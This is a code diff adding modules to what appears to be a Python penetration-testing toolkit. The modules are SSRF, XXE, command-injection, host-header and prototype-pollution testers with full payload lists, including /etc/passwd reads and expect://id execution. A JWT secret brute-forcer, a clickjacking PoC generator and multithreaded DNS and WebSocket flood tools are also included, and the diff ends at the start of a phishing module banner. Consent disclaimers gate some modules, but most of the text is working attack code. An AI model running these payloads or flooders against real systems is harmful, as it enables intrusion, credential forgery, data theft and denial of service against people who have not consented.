+    print(f"  {W}Baseline: HTTP {baseline_code}, {baseline_len} bytes{RST}\n")
+
+    found = 0
+    for payload, desc in SSRF_PAYLOADS:
+        import urllib.parse as _up
+        test_params = params.copy()
+        test_params[idx] = f"{param_name}={_up.quote(payload, safe='')}"
+        test_url = f"{base_url}?{'&'.join(test_params)}"
+        try:
+            resp = requests.get(test_url, timeout=10, allow_redirects=False)
+            diff = abs(len(resp.text) - baseline_len)
+            indicators = ["root:", "ami-id", "instance-id", "computeMetadata",
+                          "127.0.0.1", "localhost", "redis_version", "private"]
+            hit = any(ind in resp.text for ind in indicators)
+            if hit:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Sensitive content detected in response!")
+                found += 1
+            elif diff > 200 and resp.status_code != baseline_code:
+                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
+                found += 1
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}Potential SSRF: {found} suspicious response(s)!{RST}")
+    else:
+        print(f"\n  {G}No SSRF indicators detected{RST}")
+
+
+# ─── 53. JWT Analyzer ────────────────────────────────────────────────────────
+
+def jwt_analyzer():
+    print_header("JWT Analyzer")
+    token = prompt("JWT Token")
+    if not token:
+        return
+
+    import base64
+
+    parts = token.split(".")
+    if len(parts) != 3:
+        print_err("Invalid JWT format (expected 3 parts separated by dots)")
+        return
+
+    def b64_decode(data):
+        padding = 4 - len(data) % 4
+        if padding != 4:
+            data += "=" * padding
+        return base64.urlsafe_b64decode(data)
+
+    # Decode header
+    try:
+        header = json.loads(b64_decode(parts[0]))
+        print(f"\n  {Y}── Header ──{RST}")
+        for k, v in header.items():
+            print_row(k, str(v))
+    except Exception as e:
+        print_err(f"Failed to decode header: {e}")
+        return
+
+    # Decode payload
+    try:
+        payload = json.loads(b64_decode(parts[1]))
+        print(f"\n  {Y}── Payload ──{RST}")
+        for k, v in payload.items():
+            if k in ("iat", "exp", "nbf") and isinstance(v, (int, float)):
+                import datetime
+                ts = datetime.datetime.utcfromtimestamp(v).strftime("%Y-%m-%d %H:%M:%S UTC")
+                print_row(k, f"{v} ({ts})")
+                if k == "exp" and v < time.time():
+                    print(f"    {R}⚠ Token is EXPIRED!{RST}")
+            else:
+                print_row(k, str(v))
+    except Exception as e:
+        print_err(f"Failed to decode payload: {e}")
+        return
+
+    # Signature info
+    print(f"\n  {Y}── Signature ──{RST}")
+    alg = header.get("alg", "unknown")
+    print_row("Algorithm", alg)
+
+    # Security checks
+    print(f"\n  {Y}── Security Analysis ──{RST}")
+    if alg.lower() == "none":
+        print(f"  {R}[CRITICAL] Algorithm is 'none' – signature not verified!{RST}")
+    if alg.upper() in ("HS256", "HS384", "HS512"):
+        print_warn(f"HMAC algorithm ({alg}) – vulnerable to secret brute-force")
+        brute = input(f"\n  {Y}Brute-force weak secrets? (y/n):{RST} ").strip().lower()
+        if brute in ("y", "yes", "s", "si"):
+            import hmac as _hmac
+            common_secrets = [
+                "secret", "password", "123456", "admin", "key", "jwt_secret",
+                "changeme", "test", "default", "private", "supersecret",
+                "mysecret", "mykey", "token", "auth", "development", "staging",
+                "production", "qwerty", "letmein", "welcome", "abc123",
+            ]
+            spinner("Testing common secrets...", 0.5)
+            sign_input = f"{parts[0]}.{parts[1]}".encode()
+            target_sig = b64_decode(parts[2])
+            hash_func = {"HS256": "sha256", "HS384": "sha384", "HS512": "sha512"}.get(alg.upper(), "sha256")
+            for secret in common_secrets:
+                sig = _hmac.new(secret.encode(), sign_input, hash_func).digest()
+                if sig == target_sig:
+                    print(f"\n  {R}[CRITICAL] Secret found: '{secret}'{RST}")
+                    print(f"  {R}Token can be forged with this secret!{RST}")
+                    break
+            else:
+                print_ok("No common secret matched")
+
+    if header.get("kid"):
+        print_warn(f"'kid' parameter present ({header['kid']}) – check for injection")
+    if header.get("jku"):
+        print_warn(f"'jku' parameter present ({header['jku']}) – SSRF risk")
+    if header.get("x5u"):
+        print_warn(f"'x5u' parameter present ({header['x5u']}) – SSRF risk")
+
+
+# ─── 54. Clickjacking Tester ─────────────────────────────────────────────────
+
+def clickjacking_test():
+    print_header("Clickjacking Tester")
+    if not exploit_disclaimer():
+        return
+
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Checking frame protection...", 1.0)
+
+    try:
+        resp = requests.get(target, timeout=10)
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    xfo = resp.headers.get("X-Frame-Options", "")
+    csp = resp.headers.get("Content-Security-Policy", "")
+    vulnerable = True
+
+    print(f"\n  {Y}── X-Frame-Options ──{RST}")
+    if xfo:
+        print_row("Value", xfo)
+        if xfo.upper() in ("DENY", "SAMEORIGIN"):
+            print_ok("Properly configured")
+            vulnerable = False
+        elif "ALLOW-FROM" in xfo.upper():
+            print_warn(f"ALLOW-FROM is deprecated and ignored by modern browsers")
+    else:
+        print_warn("X-Frame-Options header NOT SET")
+
+    print(f"\n  {Y}── CSP frame-ancestors ──{RST}")
+    if "frame-ancestors" in csp:
+        fa = re.search(r"frame-ancestors\s+([^;]+)", csp)
+        if fa:
+            value = fa.group(1).strip()
+            print_row("Value", value)
+            if "'none'" in value or "'self'" in value:
+                print_ok("frame-ancestors properly restricts framing")
+                vulnerable = False
+    else:
+        print_warn("CSP frame-ancestors directive NOT SET")
+
+    if vulnerable:
+        print(f"\n  {R}[VULNERABLE] Target may be vulnerable to clickjacking!{RST}")
+        print(f"\n  {Y}Proof-of-Concept HTML:{RST}")
+        poc = f'''  <html>
+    <head><title>Clickjacking PoC</title></head>
+    <body>
+      <h1>Clickjacking PoC</h1>
+      <iframe src="{target}" width="800" height="600"
+              style="opacity:0.3;position:absolute;top:50px;left:50px;">
+      </iframe>
+      <button style="position:absolute;top:200px;left:200px;z-index:-1;">
+        Click me!
+      </button>
+    </body>
+  </html>'''
+        print(f"  {W}{poc}{RST}")
+    else:
+        print(f"\n  {G}Target appears protected against clickjacking{RST}")
+
+
+# ─── 55. XXE Tester ──────────────────────────────────────────────────────────
+
+XXE_PAYLOADS = [
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
+     "Classic file read (Linux)"),
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
+     "Classic file read (Windows)"),
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>',
+     "SSRF via XXE"),
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://127.0.0.1"> %xxe;]><foo>test</foo>',
+     "Parameter entity SSRF"),
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "expect://id">]><foo>&xxe;</foo>',
+     "PHP expect:// RCE"),
+    ('<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">]><foo>&xxe;</foo>',
+     "PHP filter wrapper"),
+]
+
+
+def xxe_tester():
+    print_header("XXE (XML External Entity) Tester")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target URL (accepts XML input)")
+    if not url:
+        return
+
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    print(f"\n  {Y}Testing {len(XXE_PAYLOADS)} XXE payloads...{RST}\n")
+    found = 0
+
+    # Baseline
+    try:
+        baseline = requests.post(url, data="<test>hello</test>",
+                                 headers={"Content-Type": "application/xml"}, timeout=10)
+        baseline_len = len(baseline.text)
+    except Exception:
+        baseline_len = 0
+
+    for payload, desc in XXE_PAYLOADS:
+        try:
+            resp = requests.post(url, data=payload,
+                                 headers={"Content-Type": "application/xml"}, timeout=10)
+            indicators = ["root:", "[fonts]", "uid=", "gid=", "127.0.0.1"]
+            hit = any(ind in resp.text for ind in indicators)
+            diff = abs(len(resp.text) - baseline_len)
+            if hit:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Sensitive content in response!")
+                found += 1
+            elif diff > 200:
+                print(f"    {Y}[SUSP]{RST} {desc} (response diff: {diff} bytes)")
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}XXE VULNERABLE: {found} payload(s) succeeded!{RST}")
+    else:
+        print(f"\n  {G}No XXE vulnerabilities detected{RST}")
+
+
+# ─── 56. Command Injection Tester ────────────────────────────────────────────
+
+CMDI_PAYLOADS = [
+    ("; id", "Semicolon + id"),
+    ("| id", "Pipe + id"),
+    ("|| id", "OR + id"),
+    ("& id", "Background + id"),
+    ("&& id", "AND + id"),
+    ("`id`", "Backtick injection"),
+    ("$(id)", "Command substitution"),
+    ("; cat /etc/passwd", "Semicolon + passwd"),
+    ("| cat /etc/passwd", "Pipe + passwd"),
+    ("; sleep 5", "Time-based (5s sleep)"),
+    ("| sleep 5", "Time-based pipe sleep"),
+    ("|| sleep 5", "Time-based OR sleep"),
+    ("; ping -c 3 127.0.0.1", "Ping test"),
+    ("| ping -c 3 127.0.0.1", "Pipe ping test"),
+    ("%0a id", "Newline + id"),
+    ("'; id; '", "Quote break + id"),
+    ("\"; id; \"", "Double quote break + id"),
+    ("{${id}}", "Bash brace expansion"),
+    ("; echo ARGUS_CMDI_TEST", "Echo marker"),
+    ("| echo ARGUS_CMDI_TEST", "Pipe echo marker"),
+]
+
+
+def cmd_injection():
+    print_header("Command Injection Tester")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target URL with parameter (e.g. http://target.com/ping?host=value)")
+    if not url:
+        return
+
+    parsed = urlparse(url)
+    if "=" not in parsed.query:
+        print_err("URL must contain a query parameter")
+        return
+
+    params = parsed.query.split("&")
+    print(f"\n  {Y}Parameters found:{RST}")
+    for i, p in enumerate(params):
+        print(f"    {C}{i+1}.{RST} {p}")
+
+    param_idx = input(f"\n  {Y}Select parameter (1-{len(params)}):{RST} ").strip()
+    try:
+        idx = int(param_idx) - 1
+        if not (0 <= idx < len(params)):
+            print_err("Invalid selection")
+            return
+    except ValueError:
+        print_err("Invalid input")
+        return
+
+    param_name = params[idx].split("=")[0]
+    original_value = params[idx].split("=")[1] if "=" in params[idx] else ""
+    base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
+
+    print(f"\n  {Y}Testing {len(CMDI_PAYLOADS)} command injection payloads...{RST}\n")
+    found = 0
+
+    for payload, desc in CMDI_PAYLOADS:
+        import urllib.parse as _up
+        test_params = params.copy()
+        test_params[idx] = f"{param_name}={_up.quote(original_value + payload, safe='')}"
+        test_url = f"{base_url}?{'&'.join(test_params)}"
+        try:
+            start_t = time.time()
+            resp = requests.get(test_url, timeout=12)
+            elapsed = time.time() - start_t
+
+            indicators = ["uid=", "gid=", "root:", "ARGUS_CMDI_TEST",
+                          "bin/", "sbin/", "bytes from 127.0.0.1"]
+            hit = any(ind in resp.text for ind in indicators)
+            time_based = "sleep" in payload and elapsed > 4.5
+
+            if hit:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Command output detected in response!")
+                found += 1
+            elif time_based:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Time-based: response took {elapsed:.1f}s (expected ~5s)")
+                found += 1
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}COMMAND INJECTION FOUND: {found} payload(s) succeeded!{RST}")
+    else:
+        print(f"\n  {G}No command injection detected{RST}")
+
+
+# ─── 57. Host Header Injection ───────────────────────────────────────────────
+
+def host_header_injection():
+    print_header("Host Header Injection Tester")
+    if not exploit_disclaimer():
+        return
+
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Testing host header manipulation...", 1.0)
+
+    parsed = urlparse(target)
+    original_host = parsed.netloc
+    evil = "evil.com"
+
+    tests = [
+        ("Arbitrary Host", {"Host": evil}),
+        ("X-Forwarded-Host", {"X-Forwarded-Host": evil}),
+        ("X-Host", {"X-Host": evil}),
+        ("X-Original-URL", {"X-Original-URL": "/admin"}),
+        ("X-Rewrite-URL", {"X-Rewrite-URL": "/admin"}),
+        ("X-Forwarded-Server", {"X-Forwarded-Server": evil}),
+        ("X-Forwarded-For", {"X-Forwarded-For": "127.0.0.1"}),
+        ("Forwarded", {"Forwarded": f"host={evil}"}),
+        ("Host with port", {"Host": f"{original_host}:{evil}"}),
+        ("Double Host", {"Host": original_host, "X-Forwarded-Host": evil}),
+    ]
+
+    try:
+        baseline = requests.get(target, timeout=10)
+        baseline_len = len(baseline.text)
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    print(f"\n  {Y}Testing {len(tests)} host header payloads...{RST}\n")
+    found = 0
+
+    for desc, headers in tests:
+        try:
+            resp = requests.get(target, headers=headers, timeout=10, allow_redirects=False)
+            diff = abs(len(resp.text) - baseline_len)
+            has_evil = evil in resp.text or evil in str(resp.headers)
+            redirected = resp.status_code in (301, 302, 303, 307, 308) and evil in resp.headers.get("Location", "")
+
+            if redirected:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Redirect to evil host: {resp.headers.get('Location', '')}")
+                found += 1
+            elif has_evil:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Evil host reflected in response!")
+                found += 1
+            elif diff > 500:
+                print(f"    {Y}[SUSP]{RST} {desc} (response diff: {diff} bytes)")
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}HOST HEADER INJECTION: {found} vector(s) found!{RST}")
+    else:
+        print(f"\n  {G}No host header injection detected{RST}")
+
+
+# ─── 58. Insecure Cookie Checker ─────────────────────────────────────────────
+
+def cookie_checker():
+    print_header("Insecure Cookie Checker")
+    target = prompt("Target URL")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    spinner("Fetching cookies...", 1.0)
+
+    try:
+        resp = requests.get(target, timeout=10)
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    set_cookies = resp.headers.get("Set-Cookie", "")
+    if not set_cookies and not resp.cookies:
+        print_warn("No cookies set by this page")
+        return
+
+    # Parse all Set-Cookie headers
+    raw_cookies = resp.raw.headers.getlist("Set-Cookie") if hasattr(resp.raw.headers, "getlist") else [set_cookies]
+    if not raw_cookies or raw_cookies == ['']:
+        raw_cookies = []
+        for key, val in resp.headers.items():
+            if key.lower() == "set-cookie":
+                raw_cookies.append(val)
+
+    if not raw_cookies or raw_cookies == ['']:
+        # Fallback to cookies jar
+        if resp.cookies:
+            for name, value in resp.cookies.items():
+                print(f"\n  {Y}Cookie: {W}{name}{RST}")
+                print_row("Value", value[:50] + ("..." if len(value) > 50 else ""))
+                print_warn("Cannot analyze flags (raw headers not available)")
+        else:
+            print_warn("No cookies found")
+        return
+
+    issues = 0
+    for raw in raw_cookies:
+        if not raw.strip():
+            continue
+        parts = [p.strip() for p in raw.split(";")]
+        name_val = parts[0]
+        name = name_val.split("=")[0] if "=" in name_val else name_val
+        flags = " ".join(parts[1:]).lower()
+
+        print(f"\n  {Y}Cookie: {W}{name}{RST}")
+        print_row("Raw", raw[:80] + ("..." if len(raw) > 80 else ""))
+
+        # Check Secure flag
+        if "secure" in flags:
+            print(f"    {G}✓{RST} Secure flag set")
+        else:
+            print(f"    {R}✗{RST} Secure flag MISSING (sent over HTTP)")
+            issues += 1
+
+        # Check HttpOnly flag
+        if "httponly" in flags:
+            print(f"    {G}✓{RST} HttpOnly flag set")
+        else:
+            print(f"    {R}✗{RST} HttpOnly flag MISSING (accessible via JS)")
+            issues += 1
+
+        # Check SameSite
+        if "samesite=strict" in flags:
+            print(f"    {G}✓{RST} SameSite=Strict")
+        elif "samesite=lax" in flags:
+            print(f"    {Y}~{RST} SameSite=Lax (partial protection)")
+        elif "samesite=none" in flags:
+            print(f"    {R}✗{RST} SameSite=None (cross-site requests allowed)")
+            issues += 1
+        else:
+            print(f"    {Y}~{RST} SameSite not set (defaults to Lax in modern browsers)")
+
+        # Check for sensitive naming
+        sensitive_names = ["session", "sess", "token", "auth", "jwt", "sid", "csrf"]
+        if any(s in name.lower() for s in sensitive_names):
+            if "secure" not in flags or "httponly" not in flags:
+                print(f"    {R}⚠{RST} Sensitive cookie without full protection!")
+                issues += 1
+
+    if issues:
+        print(f"\n  {R}Total security issues: {issues}{RST}")
+    else:
+        print(f"\n  {G}All cookies appear properly secured{RST}")
+
+
+# ─── 59. CSRF Token Analyzer ─────────────────────────────────────────────────
+
+def csrf_analyzer():
+    print_header("CSRF Token Analyzer")
+    if not exploit_disclaimer():
+        return
+
+    target = prompt("Target URL (page with forms)")
+    if not target:
+        return
+
+    if not target.startswith(("http://", "https://")):
+        target = "https://" + target
+
+    if BeautifulSoup is None:
+        print_err("beautifulsoup4 required: pip install beautifulsoup4")
+        return
+
+    spinner("Analyzing forms for CSRF protection...", 1.0)
+
+    try:
+        session = requests.Session()
+        resp = session.get(target, timeout=10)
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    soup = BeautifulSoup(resp.text, "html.parser")
+    forms = soup.find_all("form")
+
+    if not forms:
+        print_warn("No forms found on this page")
+        return
+
+    print_row("Forms Found", str(len(forms)))
+    vulnerable_forms = 0
+
+    for i, form in enumerate(forms, 1):
+        action = form.get("action", "(none)")
+        method = form.get("method", "GET").upper()
+        print(f"\n  {Y}── Form #{i} ──{RST}")
+        print_row("Action", action)
+        print_row("Method", method)
+
+        # Check for CSRF tokens
+        csrf_names = ["csrf", "token", "_token", "csrfmiddlewaretoken", "authenticity_token",
+                      "__RequestVerificationToken", "antiforgery", "nonce", "__csrf"]
+        inputs = form.find_all("input", {"type": "hidden"})
+        csrf_found = False
+        for inp in inputs:
+            name = inp.get("name", "").lower()
+            if any(c in name for c in csrf_names):
+                csrf_found = True
+                print(f"    {G}✓{RST} CSRF token: {inp.get('name')} = {inp.get('value', '')[:30]}...")
+                # Check token quality
+                val = inp.get("value", "")
+                if len(val) < 16:
+                    print(f"    {Y}⚠{RST} Token seems short ({len(val)} chars)")
+                if val.isdigit():
+                    print(f"    {R}⚠{RST} Token is numeric only – weak!")
+
+        # Check for meta CSRF tags
+        metas = soup.find_all("meta", attrs={"name": re.compile(r"csrf|token", re.I)})
+        for meta in metas:
+            csrf_found = True
+            print(f"    {G}✓{RST} Meta CSRF: {meta.get('name')} = {meta.get('content', '')[:30]}...")
+
+        if not csrf_found and method == "POST":
+            print(f"    {R}✗{RST} No CSRF token detected on POST form!")
+            vulnerable_forms += 1
+        elif not csrf_found and method == "GET":
+            print(f"    {Y}~{RST} GET form (CSRF less critical but check state changes)")
+
+        # Check SameSite cookies
+        for cookie_name, cookie_value in session.cookies.items():
+            if "session" in cookie_name.lower() or "csrf" in cookie_name.lower():
+                print(f"    {C}Cookie:{RST} {cookie_name}")
+
+    # Check headers
+    print(f"\n  {Y}── Response Headers ──{RST}")
+    origin_check = resp.headers.get("Access-Control-Allow-Origin", "")
+    if origin_check == "*":
+        print(f"  {R}⚠{RST} CORS allows all origins (*) – CSRF risk!")
+    elif origin_check:
+        print_row("CORS Origin", origin_check)
+
+    if vulnerable_forms:
+        print(f"\n  {R}CSRF VULNERABLE: {vulnerable_forms} form(s) without protection!{RST}")
+    else:
+        print(f"\n  {G}All POST forms appear to have CSRF protection{RST}")
+
+
+# ─── 60. Prototype Pollution Scanner ─────────────────────────────────────────
+
+PROTO_PAYLOADS = [
+    ("__proto__[polluted]=true", "Classic __proto__"),
+    ("__proto__.polluted=true", "Dot notation __proto__"),
+    ("constructor[prototype][polluted]=true", "Constructor.prototype"),
+    ("constructor.prototype.polluted=true", "Constructor dot notation"),
+    ("__proto__[status]=510", "Status code pollution"),
+    ("__proto__[headers][x-polluted]=true", "Header pollution"),
+    ("__proto__[admin]=true", "Privilege escalation"),
+    ("__proto__[isAdmin]=1", "Admin flag pollution"),
+]
+
+
+def prototype_pollution():
+    print_header("Prototype Pollution Scanner")
+    if not exploit_disclaimer():
+        return
+
+    url = prompt("Target URL")
+    if not url:
+        return
+
+    if not url.startswith(("http://", "https://")):
+        url = "https://" + url
+
+    spinner("Testing prototype pollution vectors...", 1.0)
+
+    # Baseline
+    try:
+        baseline = requests.get(url, timeout=10)
+        baseline_len = len(baseline.text)
+        baseline_code = baseline.status_code
+    except Exception as e:
+        print_err(f"Error: {e}")
+        return
+
+    print(f"\n  {Y}Testing via query parameters...{RST}\n")
+    found = 0
+    sep = "&" if "?" in url else "?"
+
+    for payload, desc in PROTO_PAYLOADS:
+        test_url = f"{url}{sep}{payload}"
+        try:
+            resp = requests.get(test_url, timeout=10)
+            diff = abs(len(resp.text) - baseline_len)
+            code_diff = resp.status_code != baseline_code
+
+            if resp.status_code == 510 and "status" in payload:
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Status code changed to 510!")
+                found += 1
+            elif "x-polluted" in str(resp.headers).lower():
+                print(f"    {R}[VULN]{RST} {desc}")
+                print(f"           Custom header injected!")
+                found += 1
+            elif code_diff and diff > 100:
+                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    # Test via JSON body
+    print(f"\n  {Y}Testing via JSON body...{RST}\n")
+    json_payloads = [
+        ({"__proto__": {"polluted": True}}, "JSON __proto__"),
+        ({"constructor": {"prototype": {"polluted": True}}}, "JSON constructor.prototype"),
+    ]
+    for payload, desc in json_payloads:
+        try:
+            resp = requests.post(url, json=payload, timeout=10)
+            diff = abs(len(resp.text) - baseline_len)
+            if resp.status_code != baseline_code or diff > 200:
+                print(f"    {Y}[SUSP]{RST} {desc} (HTTP {resp.status_code}, diff={diff})")
+            else:
+                print(f"    {W}[SAFE]{RST} {desc}")
+        except Exception:
+            print(f"    {Y}[ERR]{RST}  {desc}")
+
+    if found:
+        print(f"\n  {R}PROTOTYPE POLLUTION: {found} vector(s) confirmed!{RST}")
+    else:
+        print(f"\n  {G}No prototype pollution detected (server-side may still be vulnerable){RST}")
+
+
 # ═══════════════════════════════════════════════════════════════════════════════
 #                     STRESS TESTING / DoS MODULES
 # ═══════════════════════════════════════════════════════════════════════════════
@@ -3543,6 +5113,1467 @@ def goldeneye():
     print_row("Avg Rate", f"{counter[0]/elapsed:.0f} req/s" if elapsed > 0 else "N/A")
 
 
+# ─── 71. DNS Flood ───────────────────────────────────────────────────────────
+
+def dns_flood():
+    print_header("DNS Flood")
+    if not stress_disclaimer():
+        return
+
+    target = prompt("Target DNS server IP")
+    if not target:
+        return
+    domain = input(f"  {Y}Domain to query [{W}example.com{Y}]:{RST} ").strip() or "example.com"
+    threads_n = input(f"  {Y}Threads [50]:{RST} ").strip()
+    threads_n = min(200, max(1, int(threads_n))) if threads_n.isdigit() else 50
+    duration = input(f"  {Y}Duration seconds [30]:{RST} ").strip()
+    duration = min(300, max(1, int(duration))) if duration.isdigit() else 30
+
+    print(f"\n  {Y}Flooding {target} with DNS queries for {duration}s ({threads_n} threads)...{RST}")
+    print(f"  {W}Press Ctrl+C to stop{RST}\n")
+
+    stop_event = threading.Event()
+    counter = [0]
+    start_time = time.time()
+
+    def build_dns_query(domain_name):
+        tid = random.randint(0, 65535)
+        flags = 0x0100  # standard query, recursion desired
+        header = struct.pack(">HHHHHH", tid, flags, 1, 0, 0, 0)
+        question = b""
+        for part in domain_name.split("."):
+            question += bytes([len(part)]) + part.encode()
+        question += b"\x00"
+        question += struct.pack(">HH", 1, 1)  # A record, IN class
+        return header + question
+
+    def worker():
+        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        s.settimeout(1)
+        while not stop_event.is_set():
+            try:
+                rand_sub = ''.join(random.choices(string.ascii_lowercase, k=8))
+                query = build_dns_query(f"{rand_sub}.{domain}")
+                s.sendto(query, (target, 53))
+                counter[0] += 1
+            except Exception:
+                pass
+        s.close()
+
+    stats_thread = threading.Thread(target=_stress_stats, args=("DNS", stop_event, counter, start_time))
+    stats_thread.daemon = True
+    stats_thread.start()
+
+    workers = []
+    for _ in range(threads_n):
+        t = threading.Thread(target=worker)
+        t.daemon = True
+        t.start()
+        workers.append(t)
+
+    try:
+        time.sleep(duration)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop_event.set()
+        time.sleep(1.5)
+
+    elapsed = time.time() - start_time
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Total Queries", str(counter[0]))
+    print_row("Duration", f"{elapsed:.1f}s")
+    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} qps" if elapsed > 0 else "N/A")
+
+
+# ─── 72. WebSocket Flood ─────────────────────────────────────────────────────
+
+def websocket_flood():
+    print_header("WebSocket Flood")
+    if not stress_disclaimer():
+        return
+
+    target = prompt("Target WebSocket URL (ws:// or wss://)")
+    if not target:
+        return
+
+    if not target.startswith(("ws://", "wss://")):
+        if target.startswith("https://"):
+            target = "wss://" + target[8:]
+        elif target.startswith("http://"):
+            target = "ws://" + target[7:]
+        else:
+            target = "ws://" + target
+
+    threads_n = input(f"  {Y}Connections [50]:{RST} ").strip()
+    threads_n = min(200, max(1, int(threads_n))) if threads_n.isdigit() else 50
+    duration = input(f"  {Y}Duration seconds [30]:{RST} ").strip()
+    duration = min(300, max(1, int(duration))) if duration.isdigit() else 30
+    msg_size = input(f"  {Y}Message size bytes [1024]:{RST} ").strip()
+    msg_size = min(65536, max(1, int(msg_size))) if msg_size.isdigit() else 1024
+
+    print(f"\n  {Y}Flooding {target} for {duration}s ({threads_n} connections)...{RST}")
+    print(f"  {W}Press Ctrl+C to stop{RST}\n")
+
+    stop_event = threading.Event()
+    counter = [0]
+    start_time = time.time()
+
+    parsed = urlparse(target)
+    host = parsed.hostname
+    port = parsed.port or (443 if parsed.scheme == "wss" else 80)
+    path = parsed.path or "/"
+    use_ssl = parsed.scheme == "wss"
+
+    def ws_worker():
+        while not stop_event.is_set():
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(5)
+                if use_ssl:
+                    import ssl as _ssl
+                    ctx = _ssl.create_default_context()
+                    ctx.check_hostname = False
+                    ctx.verify_mode = _ssl.CERT_NONE
+                    s = ctx.wrap_socket(s, server_hostname=host)
+                s.connect((host, port))
+
+                # WebSocket handshake
+                key = ''.join(random.choices(string.ascii_letters, k=16))
+                import base64 as _b64
+                ws_key = _b64.b64encode(key.encode()).decode()
+                handshake = (
+                    f"GET {path} HTTP/1.1\r\n"
+                    f"Host: {host}\r\n"
+                    f"Upgrade: websocket\r\n"
+                    f"Connection: Upgrade\r\n"
+                    f"Sec-WebSocket-Key: {ws_key}\r\n"
+                    f"Sec-WebSocket-Version: 13\r\n\r\n"
+                )
+                s.send(handshake.encode())
+                s.recv(1024)
+
+                # Send frames
+                while not stop_event.is_set():
+                    payload = random.randbytes(msg_size) if hasattr(random, 'randbytes') else bytes(random.getrandbits(8) for _ in range(msg_size))
+                    # Build WebSocket text frame
+                    frame = bytearray()
+                    frame.append(0x81)  # FIN + text opcode
+                    mask_key = bytes([random.randint(0, 255) for _ in range(4)])
+                    if msg_size <= 125:
+                        frame.append(0x80 | msg_size)
+                    elif msg_size <= 65535:
+                        frame.append(0x80 | 126)
+                        frame.extend(struct.pack(">H", msg_size))
+                    else:
+                        frame.append(0x80 | 127)
+                        frame.extend(struct.pack(">Q", msg_size))
+                    frame.extend(mask_key)
+                    masked = bytes(b ^ mask_key[i % 4] for i, b in enumerate(payload))
+                    frame.extend(masked)
+                    s.send(frame)
+                    counter[0] += 1
+
+            except Exception:
+                pass
+            finally:
+                try:
+                    s.close()
+                except Exception:
+                    pass
+
+    stats_thread = threading.Thread(target=_stress_stats, args=("WS-FLOOD", stop_event, counter, start_time))
+    stats_thread.daemon = True
+    stats_thread.start()
+
+    workers = []
+    for _ in range(threads_n):
+        t = threading.Thread(target=ws_worker)
+        t.daemon = True
+        t.start()
+        workers.append(t)
+
+    try:
+        time.sleep(duration)
+    except KeyboardInterrupt:
+        pass
+    finally:
+        stop_event.set()
+        time.sleep(1.5)
+
+    elapsed = time.time() - start_time
+    print(f"\n  {Y}{'═' * 50}{RST}")
+    print_row("Total Messages", str(counter[0]))
+    print_row("Duration", f"{elapsed:.1f}s")
+    print_row("Avg Rate", f"{counter[0]/elapsed:.0f} msg/s" if elapsed > 0 else "N/A")
+    print_row("Data Sent", f"{counter[0] * msg_size / 1024 / 1024:.1f} MB")
+
+
+# ═══════════════════════════════════════════════════════════════════════════════
+#                          PHISHING MODULES
+# ═══════════════════════════════════════════════════════════════════════════════
+
+PHISHING_DISCLAIMER = f"""
+  {R}╔══════════════════════════════════════════════════════════╗
+  ║{RST} {R}▓▓▓  PHISHING SIMULATION — AUTHORIZED USE ONLY  ▓▓▓{RST}     {R}║
+  ╠══════════════════════════════════════════════════════════╣
+  ║ {Y}These tools are for AUTHORIZED phishing simulations,{R}    ║
+  ║ {W}red-team engagements, and security awareness training{R}   ║
+  ║ {W}ONLY. You must have WRITTEN AUTHORIZATION from the{R}      ║
+  ║ {W}target organization before use.{R}                          ║
+  ║                                                          ║
+  ║ {Y}Unauthorized phishing is a CRIMINAL OFFENSE.{R}             ║
